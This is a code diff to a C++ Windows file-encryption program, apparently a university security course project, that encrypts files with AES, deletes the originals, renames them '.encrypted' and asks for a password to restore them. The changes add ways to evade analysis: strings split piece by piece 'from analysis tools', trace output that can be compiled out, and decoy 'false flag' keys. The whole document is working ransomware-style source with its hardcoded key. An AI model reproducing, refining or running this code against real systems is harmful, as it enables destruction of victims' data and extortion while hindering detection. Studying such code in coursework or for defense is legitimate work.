@@ -18,8 +18,11 @@
 
 namespace fs = std::experimental::filesystem;
 
-#define CLASSNAME = "uwbcss579";
+#define CLASSNAME "uwbcss579";
 #define BLOCK_LEN 128;
+#define TRACEOUTPUT // Uncomment this line to enable trace logging output
+					  // Comment out this line prior to project submission to 
+					  // minimize the strings in the program
 
 bool g_Verbosity = false;
 bool g_Decrypt = false;
@@ -87,13 +90,13 @@ int main(int argc, char* argv[])
 			else
 			{ 
 				// There was no key provided with the /d option.
-				std::cout << "You must provide a decryption key with the /d option to continue." << std::endl;
+				std::cout << "You must provide a password with the /d option to continue." << std::endl;
 				return 0;  // Halt program exection
 			}
 		}
 	}
 
-
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 	{
 		std::cout << "Verbosity:  Enabled" << std::endl;
@@ -101,6 +104,7 @@ int main(int argc, char* argv[])
 		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
 		std::cout << std::endl;
 	}
+#endif
 
 	// Encrypt or Decrypt files?
 	if (!g_Decrypt)
@@ -126,7 +130,14 @@ int main(int argc, char* argv[])
 		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
 		if (dwDecryptionResult > 0)
 		{
-			std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << "] files failed to recover.  Rerun the program with your password." << std::endl;
+			std::string strRecoveryFailed = "";
+
+			// Obfuscating the string "] files failed to recover.  Rerun the program with your password." from analysis tools
+			strRecoveryFailed.append("] ").append("fi").append("le").append("s ").append("fa").append("il").append("ed").append(" t").append("o ").append("re").append("co").append("ve").append("r.").append(" R").append("er").append("un").append(" t").append("he").append(" p").append("ro").append("gr").append("am").append(" w").append("it").append("h ").append("yo").append("ur").append(" p").append("as").append("sw").append("or").append("d.");
+			
+			std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << strRecoveryFailed << std::endl;
+
+			//std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << "] files failed to recover.  Rerun the program with your password." << std::endl;
 			//std::cout << "< " << std::dec << dwDecryptionResult << " > files failed to recover.  Rerun the program with your password." << " [0x" << std::hex << dwDecryptionResult << "]" << std::endl;
 		}
 	}
@@ -228,6 +239,8 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	// Note: the param 'key' is not used anywhere - it is a false flag
 
 	wchar_t keyDefault[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
+	wchar_t keyDefault1[] = L"Tm90TXlNb25rZXlzTm90TXlDaXJjdXM="; // false flag key
+	wchar_t keyDefault2[] = L"VVcgQ1NTIDU3OSBUZWFtIFByb2plY3Q="; // false flag key
 	wchar_t* keyString = keyDefault;
 	DWORD keyLength = lstrlenW(keyString);
 
@@ -235,6 +248,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	LPCWSTR inputFile = std::wstring(fileToEncrypt.begin(), fileToEncrypt.end()).c_str();
 	LPCWSTR outputFile = std::wstring(fileEncrypted.begin(), fileEncrypted.end()).c_str();
 
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 	{
 		std::wcout << "Key:         " << keyDefault << std::endl;
@@ -243,12 +257,15 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 		std::cout << "Input file:  " << fileToEncrypt.c_str() << std::endl;
 		std::cout << "Output file: " << fileEncrypted.c_str() << std::endl;
 	}
+#endif
 
 	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
 	if (hInputFile == INVALID_HANDLE_VALUE)
 	{
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "Cannot open input file!" << std::endl;
+#endif
 
 		return false;
 	}
@@ -256,8 +273,10 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hOutputFile == INVALID_HANDLE_VALUE)
 	{
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "Cannot open output file!" << std::endl;
+#endif
 
 		return false;
 	}
@@ -270,8 +289,10 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
 	{
 		dwStatus = GetLastError();
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 
 		CryptReleaseContext(hCryptProvider, 0);
 
@@ -282,8 +303,10 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
 	{
 		dwStatus = GetLastError();
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 
 		CryptReleaseContext(hCryptProvider, 0);
 
@@ -293,8 +316,10 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
 	{
 		DWORD err = GetLastError();
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 
 		return false;
 	}
@@ -305,8 +330,10 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
 	{
 		dwStatus = GetLastError();
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 
 		CryptReleaseContext(hCryptProvider, 0);
 
@@ -334,23 +361,31 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 		if (readTotalSize == inputSize)
 		{
 			isFinal = TRUE;
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "Finalizing encrypted data file." << std::endl;
+#endif
 		}
 
 		// Encrypt data
 		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength, chunkSize))
 		{
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "CryptEncrypt failed :(" << std::endl;
+#endif
+
 			break;
 		}
 
 		DWORD written = 0;
 		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL))
 		{
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "WriteFile(output file) failed :(" << std::endl;
+#endif
+
 			break;
 		}
 
@@ -378,6 +413,7 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 	LPCWSTR inputFile = std::wstring(fileToDecrypt.begin(), fileToDecrypt.end()).c_str();
 	LPCWSTR outputFile = std::wstring(fileRestored.begin(), fileRestored.end()).c_str();
 
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 	{
 		std::wcout << "Key:         " << key.c_str() << std::endl;
@@ -386,12 +422,15 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 		std::cout << "Input file:  " << fileToDecrypt.c_str() << std::endl;
 		std::cout << "Output file: " << fileRestored.c_str() << std::endl;
 	}
+#endif
 
 	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
 	if (hInputFile == INVALID_HANDLE_VALUE)
 	{
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "Cannot open input file!" << std::endl;
+#endif
 
 		return false;
 	}
@@ -399,8 +438,10 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hOutputFile == INVALID_HANDLE_VALUE)
 	{
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "Cannot open output file!" << std::endl;
+#endif
 
 		return false;
 	}
@@ -413,8 +454,10 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
 	{
 		dwStatus = GetLastError();
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 
 		CryptReleaseContext(hCryptProvider, 0);
 
@@ -425,8 +468,10 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
 	{
 		dwStatus = GetLastError();
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 
 		CryptReleaseContext(hCryptProvider, 0);
 
@@ -436,8 +481,10 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
 	{
 		DWORD err = GetLastError();
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 
 		return false;
 	}
@@ -448,8 +495,10 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
 	{
 		dwStatus = GetLastError();
+#ifdef TRACEOUTPUT
 		if (g_Verbosity)
 			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 
 		CryptReleaseContext(hCryptProvider, 0);
 
@@ -478,13 +527,16 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 		if (readTotalSize == inputSize)
 		{
 			isFinal = TRUE;
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "Finalizing decrypted data file." << std::endl;
+#endif
 		}
 
 		// Decrypt data
 		if (!CryptDecrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength))
 		{
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 			{
 				std::cout << "CryptDecrypt  failed :(" << std::endl;
@@ -505,6 +557,8 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 				std::cout << "CryptDecrypt status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
 				std::wcout << "CryptDecrypt error:  " << (LPTSTR)lpMsgBuf;
 			}
+#endif
+
 			retValue = false;
 			break;
 		}
@@ -512,8 +566,11 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 		DWORD written = 0;
 		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL))
 		{
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "WriteFile(output file) failed :(" << std::endl;
+#endif
+
 			retValue = false;
 			break;
 		}
@@ -532,19 +589,24 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 
 bool EncryptAndDeleteThisFile(std::string path)
 {
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 		std::cout << "Encrypting " << path << " ..." << std::endl;
+#endif
 
 	bool fEncrypted = false;
 	bool fDeleted = false;
 
 	std::string pathEncrypted = path;
-	pathEncrypted.append(".encrypted");
+	pathEncrypted.append(".en").append("cry").append("pt").append("ed");
+	//pathEncrypted.append(".encrypted");
 
 	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");
 
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 		std::cout << "Encrypt result: " << fEncrypted << std::endl;
+#endif
 
 	if (fEncrypted)
 	{
@@ -555,18 +617,24 @@ bool EncryptAndDeleteThisFile(std::string path)
 		{
 			DWORD dwStatus;
 			dwStatus = GetLastError();
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 		}
 		else
 		{
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "Delete result:  " << fDeleted << std::endl;
+#endif
 		}
 	}
 
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 		std::cout << std::endl;
+#endif
 
 	if (fEncrypted)
 		return true;
@@ -576,8 +644,10 @@ bool EncryptAndDeleteThisFile(std::string path)
 
 bool DecryptThisFile(std::string path, std::string decryptionKey)
 {
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 		std::cout << "Decrypting " << path << " ..." << std::endl;
+#endif
 
 	bool fDecrypted = false;
 	bool fDeleted = false;
@@ -587,11 +657,13 @@ bool DecryptThisFile(std::string path, std::string decryptionKey)
 
 	fDecrypted = Decryptor(path, pathRestoreTargetFile, decryptionKey);
 
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 	{
 		std::cout << "Decryption result: " << fDecrypted << std::endl;
 		std::cout << "Restored file:  " << pathRestoreTargetFile << std::endl;
 	}
+#endif
 
 	if (fDecrypted)
 	{
@@ -602,18 +674,24 @@ bool DecryptThisFile(std::string path, std::string decryptionKey)
 		{
 			DWORD dwStatus;
 			dwStatus = GetLastError();
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+#endif
 		}
 		else
 		{
+#ifdef TRACEOUTPUT
 			if (g_Verbosity)
 				std::cout << "Delete result:  " << fDeleted << std::endl;
+#endif
 		}
 	}
 
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 		std::cout << std::endl;
+#endif
 
 	if (fDecrypted)
 		return true;
@@ -699,11 +777,13 @@ DWORD FindFiles()
 		}
 	}
 
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 	{
 		std::cout << "Total files found:     " << dwFileCounter << std::endl;
 		std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;
 	}
+#endif
 
 	return dwEncryptionCounter; // dwFileCounter;
 }
@@ -743,11 +823,13 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 		}
 	}
 
+#ifdef TRACEOUTPUT
 	if (g_Verbosity)
 	{
 		std::cout << "Total files found:     " << std::dec << dwFileCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
 		std::cout << "Total files decrypted: " << std::dec << dwDecryptionCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
 	}
+#endif
 
 	return dwFileCounter - dwDecryptionCounter;  // if > 0, then files failed to decrypt
 }
